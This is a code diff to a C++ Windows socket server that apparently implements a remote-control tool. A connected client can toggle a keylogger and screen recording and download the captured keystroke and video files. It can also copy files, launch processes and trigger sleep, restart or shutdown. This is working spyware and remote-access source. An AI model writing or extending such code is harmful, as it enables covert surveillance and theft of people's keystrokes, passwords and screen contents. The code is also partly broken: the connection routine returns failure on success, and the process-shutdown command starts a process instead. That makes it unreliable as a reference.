@@ -1,7 +1,13 @@
 #include "server.h"
+#include <sstream>
+
+Server::Server()
+{
+}
 
 void Server::Init()
 {
+    keyLogThread = std::thread(&keylogger::Keylogger, &keylog);
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
     {
         std::cerr << "WSAStartup failed\n";
@@ -45,30 +51,182 @@ void Server::Init()
         WSACleanup();
         exit(1);
     }
+}
 
+bool Server::WaitForConnection()
+{
     clientSock = accept(listenSock, nullptr, nullptr);
     if (clientSock == INVALID_SOCKET)
     {
-        std::cerr << "Accept failed\n";
-        closesocket(listenSock);
-        WSACleanup();
-        exit(1);
+        std::cerr << "Accept failed with error: " << WSAGetLastError() << std::endl;
+        return false;
     }
+    return false;
 }
 
-void Server::GetCommandFromClient()
+bool Server::GetCommandFromClient()
 {
     int lenght = recv(clientSock, command, BUFSIZE, 0);
     if (lenght > 0)
     {
         ProcessCommand();
+        return 1;
     }
+    else
+        return 0;
+}
+
+void Server::ProcessCommand()
+{
+    std::stringstream ss(command);
+    std::string com, body;
+    ss >> com >> body;
+    if (com == "COPYFILE")
+    {
+        size_t last_slash_idx = body.find_last_of('/');
+        std::string path;
+        if (std::string::npos != last_slash_idx)
+        {
+            path = body.substr(last_slash_idx + 1);
+        }
+        else
+        {
+            path = body;
+        }
+        CopyToPath(path);
+    }
+    else if (com == "TOGGLE_VIDEO")
+    {
+        if (isRecording())
+        {
+            stopRecording();
+        }
+        else
+        {
+            startRecording(videoFilePath);
+        }
+    }
+    else if (com == "GET_VIDEO")
+    {
+        if (isRecording())
+        {
+            stopRecording();
+        }
+        SendResult(videoFilePath);
+    }
+    else if (com == "TOGGLE_KEYLOGGER")
+    {
+        keylog.keyloggerON = !keylog.keyloggerON;
+        if (keylog.keyloggerON)
+            keylog.path = "../data/keylogger/" + keylog.generate_random_string(10) + ".txt";
+        if (!keylog.keyloggerON)
+        {
+            if (keyLogThread.joinable())
+            {
+                keyLogThread.join();
+            }
+        }
+    }
+    else if (com == "GET_KEYLOGGER")
+    {
+        keylog.keyloggerON = false;
+        SendResult(keylog.path);
+    }
+    else if (com == "GET_RUNNING_PROCESSS")
+    {
+        // Handle GET_RUNNING_PROCESSS
+    }
+    else if (com == "RUN_PROCESS")
+    {
+        std::wstring name(body.begin(), body.end());
+        startProcess(name);
+    }
+    else if (com == "SHUTDOWN_PROCESS")
+    {
+        std::wstring name(body.begin(), body.end());
+        startProcess(name);
+    }
+    else if (com == "SLEEP")
+    {
+        Sleep();
+    }
+    else if (com == "RESTART")
+    {
+        Restart();
+    }
+    else if (com == "SHUTDOWN")
+    {
+        ShutDown();
+    }
+}
+
+void Server::SendResult(const std::string path)
+{
+    std::ifstream file(path, std::ios::binary | std::ios::ate);
+    if (!file.is_open())
+    {
+        std::cerr << "ERROR: Could not open file: " << path << std::endl;
+        std::string error_msg = "ERROR:File not found\n";
+        send(clientSock, error_msg.c_str(), error_msg.length(), 0);
+        return;
+    }
+
+    std::streamsize file_size = file.tellg();
+    file.seekg(0, std::ios::beg);
+
+    std::string path_header = "PATH:" + path + "\n";
+    std::string size_header = "SIZE:" + std::to_string(file_size) + "\n";
+
+    send(clientSock, path_header.c_str(), path_header.length(), 0);
+    send(clientSock, size_header.c_str(), size_header.length(), 0);
+
+    std::cout << "Sending file " << path << " (" << file_size << " bytes)\n";
+    std::vector<char> buffer(8192); // 8KB buffer
+    while (file.read(buffer.data(), buffer.size()))
+    {
+        if (send(clientSock, buffer.data(), buffer.size(), 0) < 0)
+        {
+            std::cerr << "Failed to send file chunk.\n";
+            file.close();
+            return;
+        }
+    }
+
+    if (file.gcount() > 0)
+    {
+        send(clientSock, buffer.data(), file.gcount(), 0);
+    }
+
+    file.close();
+    std::cout << "File transfer complete.\n";
+}
+
+void Server::DisconnectClient()
+{
+    if(clientSock == INVALID_SOCKET)return;
+    closesocket(clientSock);
+    clientSock = INVALID_SOCKET;
 }
 
 void Server::Shutdown()
 {
-    shutdown(clientSock,SD_SEND);
-    closesocket(clientSock);
-    closesocket(listenSock);
+    if (clientSock != INVALID_SOCKET)
+    {
+        shutdown(clientSock, SD_SEND);
+        closesocket(clientSock);
+        clientSock = INVALID_SOCKET;
+    }
+    if (listenSock != INVALID_SOCKET)
+    {
+        closesocket(listenSock);
+        listenSock = INVALID_SOCKET;
+    }
+
+    keylog.keyloggerON=false;
+    if (keyLogThread.joinable())
+    {
+        keyLogThread.join();
+    }
+
     WSACleanup();
 }
